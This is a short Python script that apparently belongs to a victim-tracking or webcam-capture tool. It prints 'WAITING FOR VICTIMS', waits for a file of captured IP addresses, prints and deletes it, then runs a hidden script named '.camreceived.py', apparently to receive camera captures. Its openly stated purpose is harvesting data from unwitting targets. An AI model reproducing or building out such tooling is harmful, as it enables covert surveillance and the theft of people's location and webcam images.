import os
print ("\n{\x1b[0;30;47m  WAITING FOR VICTIMS \x1b[0m}")
while True:
	a = os.path.isfile("ip.txt")
	if a == True:
		os.system("sleep 3")
		allTextFileContents = os.popen("cat ip.txt").read();
		print(allTextFileContents);
		break
os.system("rm -rf ip.txt")
os.system("python2 .camreceived.py")
